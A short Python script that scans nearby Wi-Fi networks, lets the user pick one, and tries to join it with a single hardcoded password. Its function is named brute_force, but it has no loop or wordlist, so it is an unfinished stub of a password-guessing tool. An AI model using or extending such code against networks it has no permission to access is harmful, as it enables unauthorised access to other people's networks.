from wifi import *
from wireless import *

def wifi_scan(interface):
	cells = Cell.all(interface)
	for i in range(len(cells)):
		print("%d . %s"%(i+1, cells[i].ssid))
	
	num = raw_input("which ssid >> ")

	return cells[int(num)-1]

def brute_force(interface, cell):
	password = "a123456789"
	scheme = Scheme.for_cell(interface, cell.ssid, cell, password)

	try:
		scheme.save()
		scheme.activate()
	except exceptions.ConnectionError:
		print("connection disabled")
		scheme = Scheme.find(interface, cell.ssid)
		scheme.delete()

if __name__ == "__main__":
	interface = raw_input("which interface >> ")
	interface = "wlx1cbfcea325e6"
	cell = wifi_scan(interface)
	brute_force(interface, cell)
